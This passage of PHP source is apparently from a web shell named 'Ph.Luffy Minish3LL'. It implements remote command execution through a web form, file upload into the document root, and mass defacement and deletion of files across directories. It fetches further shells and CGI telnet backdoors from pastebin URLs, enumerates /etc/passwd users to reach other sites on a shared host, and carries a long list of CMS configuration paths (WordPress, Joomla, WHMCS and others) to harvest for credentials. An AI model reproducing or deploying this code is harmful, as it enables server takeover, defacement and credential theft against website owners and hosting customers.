    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
if(get_magic_quotes_gpc()) {
    function idx_ss($array) {
        return is_array($array) ? array_map('idx_ss', $array) : stripslashes($array);
    }
    $_POST = idx_ss($_POST);
}
?>

<!DOCTYPE HTML>

<html>
<head>
<title>Ph.Luffy Minish3LL</title>
<meta name='author' content=''>
<meta charset="UTF-8">
<style type='text/css'>

@import url(https://fonts.googleapis.com/css?family=Ubuntu);
html {
    background: #000000;
    color: #FFF8DC;
    font-size: 14px;
    width: 100%;
}
li {
    display: inline;
    margin: 5px;
    padding: 5px;
}
a {
    color: #ffffff;
    text-decoration: none;
}
a:hover {
    color: cyan;
    text-decoration: underline;
}
b {
    color: cyan;
}
pre {
    font-size: 13px;
}
table, th, td {
    border-collapse:collapse;
    background: transparent;
    font-family: 'Ubuntu mono';
    font-size: 13px;
}
.table_home, .th_home, .td_home {
    border: 1px solid #ffffff;
}
.th_home {
    color: cyan;
}
.td_home, .td_home > a {
    color: #ffffff;
}
.td_home > a:hover {
    color: gold;
}
th {
    padding: 10px;
}
tr:hover {
    background: #006400;
    color: #ffffff;
}
input[type=text], input[type=password], .input {
    background: transparent; 
    color: red;
    border: 1px solid #ffffff;
    padding: 3px;
    font-family: 'Ubuntu';
    font-size: 13px;
}
input[type=submit] {
    padding: 2px;}
input[type=submit]:hover {
    cursor: pointer;
}
input:focus, textarea:focus {
  outline: 0;
  border-color: #ffffff;
}
textarea {
    border: 1px solid #ffffff;
    width: 100%;
    height: 400px;
    padding-left: 5px;
    margin: 10px auto;
    resize: none;
    background: transparent;
    color: #ffffff;
    font-family: 'Ubuntu';
    font-size: 13px;
}
iframe {
    width: 100%;
    min-height: 500px;
}
</style>
</head>
<body>
<center>
<header>
    <pre></pre>
</header>
</center>
<?php
function path() {
    if(isset($_GET['dir'])) {
        $dir = str_replace("\\", "/", $_GET['dir']);
        @chdir($dir);
    } else {
        $dir = str_replace("\\", "/", getcwd());
    }
    return $dir;
}
function color($bold = 1, $colorid = null, $string = null) {
        $color = array(
            "</font>",              # 0 off
            "<font color='red'>",    # 1 red 
            "<font color='lime'>",    # 2 lime
            "<font color='white'>",    # 3 white
            "<font color='gold'>",    # 4 gold
        );
    return ($string !== null) ? $color[$colorid].$string.$color[0]: $color[$colorid];
}
function OS() {
    return (substr(strtoupper(PHP_OS), 0, 3) === "WIN") ? "Windows" : "Linux";
}
function exe($cmd) {
    if(function_exists('system')) {         
        @ob_start();         
        @system($cmd);         
        $buff = @ob_get_contents();         
        @ob_end_clean();         
        return $buff;     
    } elseif(function_exists('exec')) {         
        @exec($cmd,$results);         
        $buff = "";         
        foreach($results as $result) {             
            $buff .= $result;         
        } return $buff;     
    } elseif(function_exists('passthru')) {         
        @ob_start();         
        @passthru($cmd);         
        $buff = @ob_get_contents();         
        @ob_end_clean();         
        return $buff;     
    } elseif(function_exists('shell_exec')) {         
        $buff = @shell_exec($cmd);         
        return $buff;     
    } 
}
function save($filename, $mode, $file) {
    $handle = fopen($filename, $mode);
    fwrite($handle, $file);
    fclose($handle);
    return;
}
function getfile($name) {
    if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't spawn $name."));
    if($name === "adminer") $get = array("https://www.adminer.org/static/download/4.3.1/adminer-4.3.1.php", "adminer.php");
    elseif($name === "webconsole") $get = array("https://pastebin.com/raw/2i96fDCN", "webconsole.php");
    elseif($name === "cgitelnet1") $get = array("https://pastebin.com/raw/Lj46KxFT", "idx_cgi/cgitelnet1.idx");
    elseif($name === "cgitelnet2") $get = array("https://pastebin.com/raw/aKL2QWfS", "idx_cgi/cgitelnet2.idx");
    elseif($name === "LRE") $get = array("https://pastebin.com/raw/PVPfA21i", "makman.php");
    $fp = fopen($get[1], "w");
    $ch = curl_init();
           curl_setopt($ch, CURLOPT_URL, $get[0]);
           curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
           curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
           curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

           curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
             curl_setopt($ch, CURLOPT_FILE, $fp);
    return curl_exec($ch);
             curl_close($ch);
    fclose($fp);
    ob_flush();
    flush();
}
function usergroup() {
    if(!function_exists('posix_getegid')) {
        $user['name']     = @get_current_user();
        $user['uid']      = @getmyuid();
        $user['gid']      = @getmygid();
        $user['group']    = "?";
    } else {
        $user['uid']     = @posix_getpwuid(posix_geteuid());
        $user['gid']     = @posix_getgrgid(posix_getegid());
        $user['name']     = $user['uid']['name'];
        $user['uid']     = $user['uid']['uid'];
        $user['group']     = $user['gid']['name'];
        $user['gid']     = $user['gid']['gid'];
    }
    return (object) $user;
}
function getuser() {
    $fopen = fopen("/etc/passwd", "r") or die(color(1, 1, "Can't read /etc/passwd"));
    while($read = fgets($fopen)) {
        preg_match_all('/(.*?):x:/', $read, $getuser);
        $user[] = $getuser[1][0];
    }
    return $user;
}
function getdomainname() {
    $fopen = fopen("/etc/named.conf", "r");
    while($read = fgets($fopen)) {
        preg_match_all("#/var/named/(.*?).db#", $read, $getdomain);
        $domain[] = $getdomain[1][0];
    }
    return $domain;
}
function hddsize($size) {
    if($size >= 1073741824)
        return sprintf('%1.2f',$size / 1073741824 ).' GB';
    elseif($size >= 1048576)
        return sprintf('%1.2f',$size / 1048576 ) .' MB';
    elseif($size >= 1024)
        return sprintf('%1.2f',$size / 1024 ) .' KB';
    else
        return $size .' B';
}
function hdd() {
    $hdd['size'] = hddsize(disk_total_space("/"));
    $hdd['free'] = hddsize(disk_free_space("/"));
    $hdd['used'] = $hdd['size'] - $hdd['free'];
    return (object) $hdd;
}
function writeable($path, $perms) {
    return (!is_writable($path)) ? color(1, 1, $perms) : color(1, 2, $perms);
}
function perms($path) {
    $perms = fileperms($path);
    if (($perms & 0xC000) == 0xC000) {
        // Socket
        $info = 's';
    } 
    elseif (($perms & 0xA000) == 0xA000) {
        // Symbolic Link
        $info = 'l';
    } 
    elseif (($perms & 0x8000) == 0x8000) {
        // Regular
        $info = '-';
    } 
    elseif (($perms & 0x6000) == 0x6000) {
        // Block special
        $info = 'b';
    } 
    elseif (($perms & 0x4000) == 0x4000) {
        // Directory
        $info = 'd';
    } 
    elseif (($perms & 0x2000) == 0x2000) {
        // Character special
        $info = 'c';
    } 
    elseif (($perms & 0x1000) == 0x1000) {
        // FIFO pipe
        $info = 'p';
    } 
    else {
        // Unknown
        $info = 'u';
    }
        // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
    (($perms & 0x0800) ? 's' : 'x' ) :
    (($perms & 0x0800) ? 'S' : '-'));
    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
    (($perms & 0x0400) ? 's' : 'x' ) :
    (($perms & 0x0400) ? 'S' : '-'));
    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
    (($perms & 0x0200) ? 't' : 'x' ) :
    (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}
function lib_installed() {
    $lib[] = "MySQL: ".(function_exists('mysql_connect') ? color(1, 2, "ON") : color(1, 1, "OFF"));
    $lib[] = "cURL: ".(function_exists('curl_version') ? color(1, 2, "ON") : color(1, 1, "OFF"));
    $lib[] = "WGET: ".(exe('wget --help') ? color(1, 2, "ON") : color(1, 1, "OFF"));
    $lib[] = "Perl: ".(exe('perl --help') ? color(1, 2, "ON") : color(1, 1, "OFF"));
    $lib[] = "Python: ".(exe('python --help') ? color(1, 2, "ON") : color(1, 1, "OFF"));
    return implode(" | ", $lib);
}
function pwd() {
    $dir = explode("/", path());
    foreach($dir as $key => $index) {
        print "<a href='?dir=";
        for($i = 0; $i <= $key; $i++) {
            print $dir[$i];
            if($i != $key) {
            print "/";
            }
        }
        print "'>$index</a>/";
    }
    print "<br>";
    print (OS() === "Windows") ? windisk() : "";
}
function windisk() {
    $letters = "";
    $v = explode("\\", path());
    $v = $v[0];
     foreach(range("A", "Z") as $letter) {
          $bool = $isdiskette = in_array($letter, array("A"));
          if(!$bool) $bool = is_dir("$letter:\\");
          if($bool) {
               $letters .= "[ <a href='?dir=$letter:\\'".($isdiskette?" onclick=\"return confirm('Make sure that the diskette is inserted properly, otherwise an error may occur.')\"":"").">";
               if($letter.":" != $v) {
                   $letters .= $letter;
               }
               else {
                   $letters .= color(1, 2, $letter);
               }
               $letters .= "</a> ]";
          }
    }
    if(!empty($letters)) {
        print "Detected Drives $letters<br>";
    }
    if(count($quicklaunch) > 0) {
        foreach($quicklaunch as $item) {
              $v = realpath(path(). "..");
              if(empty($v)) {
                  $a = explode(DIRECTORY_SEPARATOR,path());
                  unset($a[count($a)-2]);
                  $v = join(DIRECTORY_SEPARATOR, $a);
              }
              print "<a href='".$item[1]."'>".$item[0]."</a>";
        }
    }
}
function serverinfo() {
    $disable_functions = @ini_get('disable_functions');
    $disable_functions = (!empty($disable_functions)) ? color(1, 1, $disable_functions) : color(1, 2, "NONE");
    $output[] = "SERVER IP ".color(1, 2, $GLOBALS['SERVERIP'])." / YOUR IP ".color(1, 2, $_SERVER['REMOTE_ADDR']);
    $output[] = "WEB SERVER  : ".color(1, 2, $_SERVER['SERVER_SOFTWARE']);
    $output[] = "SYSTEM      : ".color(1, 2, php_uname());
    $output[] = "USER / GROUP: ".color(1, 2, usergroup()->name)."(".color(1, 2 , usergroup()->uid).") / ".color(1, 2 , usergroup()->group)."(".color(1, 2 , usergroup()->gid).")";
    $output[] = "HDD         : ".color(1, 2, hdd()->used)." / ".color(1, 2 , hdd()->size)." (Free: ".color(1, 2 , hdd()->free).")";
    $output[] = "PHP VERSION : ".color(1, 2, @phpversion());
    $output[] = "SAFE MODE   : ".(@ini_get(strtoupper("safe_mode")) === "ON" ? color(1, 2, "ON") : color(1, 2, "OFF"));
    $output[] = "DISABLE FUNC: $disable_functions";
    $output[] = lib_installed();
    $output[] = "Current Dir (".writeable(path(), perms(path())).") ";
    print "<pre>";
    print implode("<br>", $output);
    pwd();
    print "</pre>";
}
function curl($url, $post = false, $data = null) {
    $ch = curl_init($url);
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
          curl_setopt($ch, CURLOPT_TIMEOUT, 10);
          curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    if($post) {
          curl_setopt($ch, CURLOPT_POST, true);
          curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    }
    return curl_exec($ch);
          curl_close($ch);
}
function reverse() {
    $response = curl("http://domains.yougetsignal.com/domains.php", TRUE, "remoteAddress=".$GLOBALS['SERVERIP']."&ket=");
    $response = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $response)))))))))))));
    $explode  = explode(",,", $response);
    unset($explode[0]);
    foreach($explode as $domain) {
        $domain = "http://$domain";
        $domain = str_replace(",", "", $domain);
        $url[]     = $domain;
        ob_flush();
        flush();
    }
    return $url;
}
function getValue($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start     = strpos($param, $kata1) + strlen($kata1);
    $end     = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
function massdeface($dir, $file, $filename, $type = null) {
    $scandir = scandir($dir);
    foreach($scandir as $dir_) {
        $path     = "$dir/$dir_";
        $location = "$path/$filename";
        if($dir_ === "." || $dir_ === "..") {
            file_put_contents($location, $file);
        }
        else {
            if(is_dir($path) AND is_writable($path)) {
                print "[".color(1, 2, "DONE")."] ".color(1, 4, $location)."<br>";
                file_put_contents($location, $file);
                if($type === "-alldir") {
                    massdeface($path, $file, $filename, "-alldir");
                }
            }
        }
    }
}
function massdelete($dir, $filename) {
    $scandir = scandir($dir);
    foreach($scandir as $dir_) {
        $path     = "$dir/$dir_";
        $location = "$path/$filename";
        if($dir_ === '.') {
            if(file_exists("$dir/$filename")) {
                unlink("$dir/$filename");
            }
        } 
        elseif($dir_ === '..') {
            if(file_exists(dirname($dir)."/$filename")) {
                unlink(dirname($dir)."/$filename");
            }
        } 
        else {
            if(is_dir($path) AND is_writable($path)) {
                if(file_exists($location)) {
                    print "[".color(1, 2, "DELETED")."] ".color(1, 4, $location)."<br>";
                    unlink($location);
                    massdelete($path, $filename);
                }
            }
        }
    }
}
function tools($toolsname, $args = null) {
    if($toolsname === "cmd") {
        print "<form method='post' action='?do=cmd&dir=".path()."' style='margin-top: 15px;'>
              ".usergroup()->name."@".$GLOBALS['SERVERIP'].": ~ $
              <input style='border: none; border-bottom: 1px solid #ffffff;' type='text' name='cmd' required>
              <input style='border: none; border-bottom: 1px solid #ffffff;' class='input' type='submit' value='>>'>
              </form>";
    }
    elseif($toolsname === "readfile") {
        if(empty($args)) die(color(1, 1, $msg));
        if(!is_file($args)) die(color(1, 1, "File '$args' is not exists."));
        print "<pre>";
        print htmlspecialchars(file_get_contents($args));
        print "</pre>";
    }
    elseif($toolsname === "spawn") {
        if($args === "adminer") {
            if(file_exists("adminer.php")) {
                print "Login Adminer: <a href='".$GLOBALS['FILEPATH']."/adminer.php' target='_blank'>http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/adminer.php</a>";
            }
            else {
                if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create file 'Adminer'."));
                if(getfile("adminer")) {
                    print "Login Adminer: <a href='".$GLOBALS['FILEPATH']."/adminer.php' target='_blank'>http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/adminer.php</a>";
                }
                else {
                    print color(1, 1, "Error while downloading file Adminer.");
                    @unlink("adminer.php");
                }
            }
        }
        elseif($args === "webconsole") {
            if(file_exists("webconsole.php")) {
                print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/webconsole.php' frameborder='0' scrolling='yes'></iframe>";
            }
            else {
                if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create file 'WebConsole'."));
                if(getfile("webconsole")) {
                    print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/webconsole.php' frameborder='0' scrolling='yes'></iframe>";
                }
                else {
                    print color(1, 1, "Error while downloading file WebConsole.");
                    @unlink("webconsole.php");
                }
            }
        }
        elseif($args === "cgitelnet1") {
            if(file_exists("idx_cgi/cgitelnet1.idx")) {
                print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/idx_cgi/cgitelnet1.idx' frameborder='0' scrolling='yes'></iframe>";
            }
            elseif(file_exists('cgitelnet1.idx')) {
                print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/cgitelnet1.idx' frameborder='0' scrolling='yes'></iframe>";
            }
            else {
                if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create directory 'idx_cgi'."));
                if(!is_dir(path()."/idx_cgi/")) {
                    @mkdir('idx_cgi', 0755);
                    save("idx_cgi/.htaccess", "w", "AddHandler cgi-script .idx");
                }
                if(getfile("cgitelnet1")) {
                    chmod('idx_cgi/cgitelnet1.idx', 0755);
                    print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/idx_cgi/cgitelnet1.idx' frameborder='0' scrolling='yes'></iframe>";
                }
                else {
                    print color(1, 1, "Error while downloading file CGI Telnet.");
                    @rmdir(path()."/idx_cgi/");
                    if(!@rmdir(path()."/idx_cgi/") AND OS() === "Linux") @exe("rm -rf ".path()."/idx_cgi/");
                    if(!@rmdir(path()."/idx_cgi/") AND OS() === "Windows") @exe("rmdir /s /q ".path()."/idx_cgi/");
                }
            }
    
        }
        elseif($args === "cgitelnet2") {
            if(file_exists("idx_cgi/cgitelnet2.idx")) {
                print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/idx_cgi/cgitelnet2.idx' frameborder='0' scrolling='yes'></iframe>";
            }
            elseif(file_exists('cgitelnet2.idx')) {
                print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/cgitelnet2.idx' frameborder='0' scrolling='no'></iframe>";
            }
            else {
                if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create directory 'idx_cgi'."));
                if(!is_dir(path()."/idx_cgi/")) {
                    @mkdir('idx_cgi', 0755);
                    save("idx_cgi/.htaccess", "w", "AddHandler cgi-script .idx");
                }
                if(getfile("cgitelnet2")) {
                    chmod('idx_cgi/cgitelnet2.idx', 0755);
                    print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/idx_cgi/cgitelnet2.idx' frameborder='0' scrolling='yes'></iframe>";
                }
                else {
                    print color(1, 1, "Error while downloading file CGI Telnet.");
                    @rmdir(path()."/idx_cgi/");
                    if(!@rmdir(path()."/idx_cgi/") AND OS() === "Linux") @exe("rm -rf ".path()."/idx_cgi/");
                    if(!@rmdir(path()."/idx_cgi/") AND OS() === "Windows") @exe("rmdir /s /q ".path()."/idx_cgi/");
                }
            }
    
        }
        elseif($args === "phpinfo") {
            if(file_exists('phpinfo.php') AND preg_match("/phpinfo()/", file_get_contents('phpinfo.php'))) {
                print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/phpinfo.php' frameborder='0' scrolling='yes'></iframe>";
            }
            else {
                if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create file 'phpinfo'."));
                save("phpinfo.php", "w", "<?php print '<html><style>html,body {background: #000000;}</style><div style=\'background: #000000; color: #cccccc;\'>'; phpinfo(); print '</div></html>'; ?>");
                print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/phpinfo.php' frameborder='0' scrolling='yes'></iframe>";
            }
        }
    }
    elseif($toolsname === "upload") {
        if($_POST['upload']) {
            if($_POST['uploadtype'] === '1') {
                if(@copy($_FILES['file']['tmp_name'], path().DIRECTORY_SEPARATOR.$_FILES['file']['name']."")) {
                    $act = color(1, 2, "Uploaded!")." at <i><b>".path().DIRECTORY_SEPARATOR.$_FILES['file']['name']."</b></i>";
                } 
                else {
                    $act = color(1, 1, "Failed to upload file!");
                }
            } 
            elseif($_POST['uploadtype'] === '2') {
                $root = $_SERVER['DOCUMENT_ROOT'].DIRECTORY_SEPARATOR.$_FILES['file']['name'];
                $web = $_SERVER['HTTP_HOST'].DIRECTORY_SEPARATOR.$_FILES['file']['name'];
                if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
                    if(@copy($_FILES['file']['tmp_name'], $root)) {
                        $act = color(1, 2, "Uploaded!")." at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
                    } 
                    else {
                        $act = color(1, 1, "Failed to upload file!");
                    }
                } 
                else {
                    $act = color(1, 1, "Failed to upload file!");
                }
            }
        }
        print "Upload File: $act
              <form method='post' enctype='multipart/form-data'>
              <input type='radio' name='uploadtype' value='1' checked>current_dir [ ".writeable(path(), "Writeable")." ] 
              <input type='radio' name='uploadtype' value='2'>document_root [ ".writeable($_SERVER['DOCUMENT_ROOT'], "Writeable")." ]<br>
              <input type='file' name='file'>
              <input type='submit' value='upload' name='upload'>
              </form>";
    }
    elseif($toolsname === "jumping") {
        $i = 0;
        foreach(getuser() as $user) {
            $path = "/home/$user/public_html";
            if(is_readable($path)) {
                $status = color(1, 2, "[R]");
                if(is_writable($path)) {
                    $status = color(1, 2, "[RW]");
                }
                $i++;
                print "$status <a href='?dir=$path'>".color(1, 4, $path)."</a>";
                if(!function_exists('posix_getpwuid')) print "<br>";
                if(!getdomainname()) print " => ".color(1, 1, "Can't get domain name")."<br>";
                foreach(getdomainname() as $domain) {
                    $userdomain = (object) @posix_getpwuid(@fileowner("/etc/valiases/$domain"));
                    $userdomain = $userdomain->name;
                    if($userdomain === $user) {
                        print " => <a href='http://$domain/' target='_blank'>".color(1, 2, $domain)."</a><br>";
                        break;
                    }
                }
            }
        }
        print ($i === 0) ? "" : "<p>".color(1, 3, "Total ada $i kamar di ".$GLOBALS['SERVERIP'])."</p>";
    }
    elseif($toolsname === "idxconfig") {
        if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create directory 'idx_config'."));
        if(!is_dir(path()."/idx_config/")) {
            @mkdir('idx_config', 0755);
            $htaccess = "Options all\nDirectoryIndex luf.htm\nSatisfy Any";
            save("idx_config/.htaccess","w", $htaccess);
            foreach(getuser() as $user) {
                $user_docroot = "/home/$user/public_html/";
                if(is_readable($user_docroot)) {
                    $getconfig = array(
                        "/home/$user/.accesshash" => "WHM-accesshash",
                        "$user_docroot/config/koneksi.php" => "Lokomedia",
                        "$user_docroot/forum/config.php" => "phpBB",
                        "$user_docroot/sites/default/settings.php" => "Drupal",
                        "$user_docroot/config/settings.inc.php" => "PrestaShop",
                        "$user_docroot/app/etc/local.xml" => "Magento",
                        "$user_docroot/admin/config.php" => "OpenCart",
                        "$user_docroot/application/config/database.php" => "Ellislab",
                        "$user_docroot/vb/includes/config.php" => "Vbulletin",
                        "$user_docroot/includes/config.php" => "Vbulletin",
                        "$user_docroot/forum/includes/config.php" => "Vbulletin",
                        "$user_docroot/forums/includes/config.php" => "Vbulletin",
                        "$user_docroot/cc/includes/config.php" => "Vbulletin",
                        "$user_docroot/inc/config.php" => "MyBB",
                        "$user_docroot/includes/configure.php" => "OsCommerce",
                        "$user_docroot/shop/includes/configure.php" => "OsCommerce",
                        "$user_docroot/os/includes/configure.php" => "OsCommerce",
                        "$user_docroot/oscom/includes/configure.php" => "OsCommerce",
                        "$user_docroot/products/includes/configure.php" => "OsCommerce",
                        "$user_docroot/cart/includes/configure.php" => "OsCommerce",
                        "$user_docroot/inc/conf_global.php" => "IPB",
                        "$user_docroot/wp-config.php" => "Wordpress",
                        "$user_docroot/wp/test/wp-config.php" => "Wordpress",
                        "$user_docroot/blog/wp-config.php" => "Wordpress",
                        "$user_docroot/beta/wp-config.php" => "Wordpress",
                        "$user_docroot/portal/wp-config.php" => "Wordpress",
                        "$user_docroot/site/wp-config.php" => "Wordpress",
                        "$user_docroot/wp/wp-config.php" => "Wordpress",
                        "$user_docroot/WP/wp-config.php" => "Wordpress",
                        "$user_docroot/news/wp-config.php" => "Wordpress",
                        "$user_docroot/wordpress/wp-config.php" => "Wordpress",
                        "$user_docroot/test/wp-config.php" => "Wordpress",
                        "$user_docroot/demo/wp-config.php" => "Wordpress",
                        "$user_docroot/home/wp-config.php" => "Wordpress",
                        "$user_docroot/v1/wp-config.php" => "Wordpress",
                        "$user_docroot/v2/wp-config.php" => "Wordpress",
                        "$user_docroot/press/wp-config.php" => "Wordpress",
                        "$user_docroot/new/wp-config.php" => "Wordpress",
                        "$user_docroot/blogs/wp-config.php" => "Wordpress",
                        "$user_docroot/configuration.php" => "Joomla",
                        "$user_docroot/blog/configuration.php" => "Joomla",
                        "$user_docroot/submitticket.php" => "^WHMCS",
                        "$user_docroot/cms/configuration.php" => "Joomla",
                        "$user_docroot/beta/configuration.php" => "Joomla",
                        "$user_docroot/portal/configuration.php" => "Joomla",
                        "$user_docroot/site/configuration.php" => "Joomla",
                        "$user_docroot/main/configuration.php" => "Joomla",
                        "$user_docroot/home/configuration.php" => "Joomla",
                        "$user_docroot/demo/configuration.php" => "Joomla",
                        "$user_docroot/test/configuration.php" => "Joomla",
                        "$user_docroot/v1/configuration.php" => "Joomla",
                        "$user_docroot/v2/configuration.php" => "Joomla",
                        "$user_docroot/joomla/configuration.php" => "Joomla",
                        "$user_docroot/new/configuration.php" => "Joomla",
                        "$user_docroot/WHMCS/submitticket.php" => "WHMCS",
                        "$user_docroot/whmcs1/submitticket.php" => "WHMCS",
                        "$user_docroot/Whmcs/submitticket.php" => "WHMCS",
                        "$user_docroot/whmcs/submitticket.php" => "WHMCS",
                        "$user_docroot/whmcs/submitticket.php" => "WHMCS",
                        "$user_docroot/WHMC/submitticket.php" => "WHMCS",
                        "$user_docroot/Whmc/submitticket.php" => "WHMCS",
                        "$user_docroot/whmc/submitticket.php" => "WHMCS",
                        "$user_docroot/WHM/submitticket.php" => "WHMCS",
                        "$user_docroot/Whm/submitticket.php" => "WHMCS",
                        "$user_docroot/whm/submitticket.php" => "WHMCS",
                        "$user_docroot/HOST/submitticket.php" => "WHMCS",
                        "$user_docroot/Host/submitticket.php" => "WHMCS",
                        "$user_docroot/host/submitticket.php" => "WHMCS",
                        "$user_docroot/SUPPORTES/submitticket.php" => "WHMCS",
                        "$user_docroot/Supportes/submitticket.php" => "WHMCS",
                        "$user_docroot/supportes/submitticket.php" => "WHMCS",
                        "$user_docroot/domains/submitticket.php" => "WHMCS",
                        "$user_docroot/domain/submitticket.php" => "WHMCS",
                        "$user_docroot/Hosting/submitticket.php" => "WHMCS",
                        "$user_docroot/HOSTING/submitticket.php" => "WHMCS",
                        "$user_docroot/hosting/submitticket.php" => "WHMCS",
                        "$user_docroot/CART/submitticket.php" => "WHMCS",
                        "$user_docroot/Cart/submitticket.php" => "WHMCS",
                        "$user_docroot/cart/submitticket.php" => "WHMCS",
                        "$user_docroot/ORDER/submitticket.php" => "WHMCS",
                        "$user_docroot/Order/submitticket.php" => "WHMCS",
                        "$user_docroot/order/submitticket.php" => "WHMCS",
                        "$user_docroot/CLIENT/submitticket.php" => "WHMCS",
                        "$user_docroot/Client/submitticket.php" => "WHMCS",
                        "$user_docroot/client/submitticket.php" => "WHMCS",
                        "$user_docroot/CLIENTAREA/submitticket.php" => "WHMCS",
                        "$user_docroot/Clientarea/submitticket.php" => "WHMCS",
                        "$user_docroot/clientarea/submitticket.php" => "WHMCS",
                        "$user_docroot/SUPPORT/submitticket.php" => "WHMCS",
                        "$user_docroot/Support/submitticket.php" => "WHMCS",
                        "$user_docroot/support/submitticket.php" => "WHMCS",
                        "$user_docroot/BILLING/submitticket.php" => "WHMCS",
                        "$user_docroot/Billing/submitticket.php" => "WHMCS",
                        "$user_docroot/billing/submitticket.php" => "WHMCS",
                        "$user_docroot/BUY/submitticket.php" => "WHMCS",
                        "$user_docroot/Buy/submitticket.php" => "WHMCS",
                        "$user_docroot/buy/submitticket.php" => "WHMCS",
                        "$user_docroot/MANAGE/submitticket.php" => "WHMCS",
                        "$user_docroot/Manage/submitticket.php" => "WHMCS",
                        "$user_docroot/manage/submitticket.php" => "WHMCS",
                        "$user_docroot/CLIENTSUPPORT/submitticket.php" => "WHMCS",
                        "$user_docroot/ClientSupport/submitticket.php" => "WHMCS",
                        "$user_docroot/Clientsupport/submitticket.php" => "WHMCS",
                        "$user_docroot/clientsupport/submitticket.php" => "WHMCS",
                        "$user_docroot/CHECKOUT/submitticket.php" => "WHMCS",
                        "$user_docroot/Checkout/submitticket.php" => "WHMCS",
                        "$user_docroot/checkout/submitticket.php" => "WHMCS",
                        "$user_docroot/BILLINGS/submitticket.php" => "WHMCS",
                        "$user_docroot/Billings/submitticket.php" => "WHMCS",
                        "$user_docroot/billings/submitticket.php" => "WHMCS",
                        "$user_docroot/BASKET/submitticket.php" => "WHMCS",
                        "$user_docroot/Basket/submitticket.php" => "WHMCS",
                        "$user_docroot/basket/submitticket.php" => "WHMCS",
                        "$user_docroot/SECURE/submitticket.php" => "WHMCS",
                        "$user_docroot/Secure/submitticket.php" => "WHMCS",
                        "$user_docroot/secure/submitticket.php" => "WHMCS",
                        "$user_docroot/SALES/submitticket.php" => "WHMCS",
                        "$user_docroot/Sales/submitticket.php" => "WHMCS",
                        "$user_docroot/sales/submitticket.php" => "WHMCS",
                        "$user_docroot/BILL/submitticket.php" => "WHMCS",
                        "$user_docroot/Bill/submitticket.php" => "WHMCS",
                        "$user_docroot/bill/submitticket.php" => "WHMCS",
                        "$user_docroot/PURCHASE/submitticket.php" => "WHMCS",
                        "$user_docroot/Purchase/submitticket.php" => "WHMCS",
                        "$user_docroot/purchase/submitticket.php" => "WHMCS",
                        "$user_docroot/ACCOUNT/submitticket.php" => "WHMCS",
                        "$user_docroot/Account/submitticket.php" => "WHMCS",
                        "$user_docroot/account/submitticket.php" => "WHMCS",
                        "$user_docroot/USER/submitticket.php" => "WHMCS",
                        "$user_docroot/User/submitticket.php" => "WHMCS",
                        "$user_docroot/user/submitticket.php" => "WHMCS",
                        "$user_docroot/CLIENTS/submitticket.php" => "WHMCS",
                        "$user_docroot/Clients/submitticket.php" => "WHMCS",
                        "$user_docroot/clients/submitticket.php" => "WHMCS",
                        "$user_docroot/BILLINGS/submitticket.php" => "WHMCS",
                        "$user_docroot/Billings/submitticket.php" => "WHMCS",
                        "$user_docroot/billings/submitticket.php" => "WHMCS",
                        "$user_docroot/MY/submitticket.php" => "WHMCS",
                        "$user_docroot/My/submitticket.php" => "WHMCS",
                        "$user_docroot/my/submitticket.php" => "WHMCS",
                        "$user_docroot/secure/whm/submitticket.php" => "WHMCS",
                        "$user_docroot/secure/whmcs/submitticket.php" => "WHMCS",
                        "$user_docroot/panel/submitticket.php" => "WHMCS",
                        "$user_docroot/clientes/submitticket.php" => "WHMCS",
                        "$user_docroot/cliente/submitticket.php" => "WHMCS",
